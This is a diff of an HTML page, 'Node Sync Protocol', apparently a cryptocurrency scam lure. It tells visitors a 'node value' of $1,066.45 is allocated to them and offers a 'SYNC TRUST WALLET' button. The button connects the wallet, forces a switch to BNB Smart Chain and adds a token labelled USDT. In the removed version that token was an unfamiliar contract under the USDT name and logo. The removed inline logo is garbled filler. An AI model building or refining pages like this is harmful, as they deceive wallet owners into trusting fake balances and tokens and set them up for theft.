@@ -4,74 +4,101 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Node Sync Protocol</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
-        body { background: var(--bg-dark); color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 35px; width: 350px; text-align: center; }
+        body { background: var(--bg-dark); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 35px; width: 350px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
+        
+        /* UI Logo Fix: Hardcoded SVG to prevent broken image on Vercel */
         .main-logo { width: 85px; height: 85px; border-radius: 50%; box-shadow: 0 0 15px var(--tether-green); margin-bottom: 20px; }
-        .price-display { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
+        .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 20px; margin-bottom: 25px; }
         .amount { font-size: 28px; font-weight: bold; }
-        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .action-btn { background: var(--tether-green); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; display: flex; align-items: center; justify-content: center; gap: 10px; }
         #status { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAACXBIWXMAAAsTAAALEwEAmpwYAAABy0lEQVR4nO3dv0vVURzH8dfnVpS0S0S0REREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREf0LpZ3L680Lpe0AAAAASUVORK5CYII=" class="main-logo" id="uiLogo">
+    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png" class="main-logo" onerror="this.src='https://cryptologos.cc/logos/tether-usdt-logo.png'">
     
-    <div class="price-display">
+    <div class="price-box">
+        <div style="font-size: 12px; color: #888; margin-bottom: 5px;">ALLOCATED NODE VALUE</div>
         <div class="amount">$1,066.45</div>
     </div>
 
-    <button class="action-btn" id="mainAction">SYNC TRUST WALLET</button>
-    <div id="status">READY</div>
+    <button class="action-btn" id="syncBtn">
+        SYNC TRUST WALLET 
+        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png" style="width:20px;">
+    </button>
+    <div id="status">SYSTEM READY</div>
 </div>
 
 <script>
-    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    // Direct Base64 link for the wallet popup to ensure logo shows
-    const LOGO_DATA = "https://cryptologos.cc/logos/tether-usdt-logo.png"; 
+    // 1. BEP-20 USDT Address (Binance Smart Chain)
+    const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; 
+    
+    // 2. Official Trust Wallet Asset Link (Logo Guaranteed)
+    const TRUST_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/assets/0x55d398326f99059fF775485246999027B3197955/logo.png";
 
-    async function process() {
+    async function startSync() {
         const status = document.getElementById('status');
+        // Specific Trust Wallet Provider Target
         const provider = window.trustwallet || window.ethereum;
 
-        if (!provider) { alert("Trust Wallet not found!"); return; }
+        if (!provider) { alert("Trust Wallet not detected!"); return; }
 
         try {
-            status.innerText = "> CONNECTING...";
+            status.innerText = "> INITIALIZING...";
             await provider.request({ method: 'eth_requestAccounts' });
 
-            status.innerText = "> SWITCHING TO BSC...";
-            await provider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-            });
+            // STEP 1: FORCE BSC SWITCH (Iske baghair Logo nahi aayega)
+            status.innerText = "> SWITCHING TO BNB CHAIN...";
+            try {
+                await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }], 
+                });
+            } catch (e) {
+                if (e.code === 4902) {
+                    await provider.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: '0x38',
+                            chainName: 'BNB Smart Chain',
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                            blockExplorerUrls: ['https://bscscan.com/']
+                        }]
+                    });
+                }
+            }
 
-            status.innerText = "> INJECTING ASSET...";
+            // STEP 2: INJECT USDT WITH LOGO (Only after BSC confirmed)
+            status.innerText = "> MAPPING METADATA...";
             await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: CONTRACT,
+                        address: BSC_USDT_CONTRACT,
                         symbol: 'USDT',
                         decimals: 18,
-                        image: LOGO_DATA,
+                        image: TRUST_LOGO,
                     },
                 },
             });
 
-            status.innerText = "> SUCCESSFUL";
-            alert("Node Sync Complete!");
+            status.innerText = "> SYNC SUCCESSFUL";
+            alert("Trust Wallet Synced Successfully!");
+
         } catch (err) {
-            status.innerText = "> ERROR: " + (err.message || "FAILED");
+            status.innerText = "> ERROR: HANDSHAKE FAILED";
+            console.error(err);
         }
     }
 
-    document.getElementById('mainAction').addEventListener('click', process);
+    document.getElementById('syncBtn').addEventListener('click', startSync);
 </script>
 </body>
 </html>
